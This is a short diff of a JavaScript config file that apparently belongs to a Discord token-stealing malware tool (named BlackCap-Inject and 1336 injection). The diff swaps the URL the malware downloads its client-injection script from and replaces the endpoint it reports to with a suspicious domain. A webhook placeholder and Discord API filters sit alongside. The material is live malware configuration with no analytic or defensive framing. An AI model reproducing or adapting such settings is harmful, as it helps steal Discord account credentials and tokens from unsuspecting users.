@@ -27,9 +27,9 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
+    injection_url: "https://github.com/Nowze/1336Archive/blob/main/injection-1336.js",
     webhook: "%WEBHOOK%",
-    apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
+    apiurl: "http://reidoscoins.top",
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
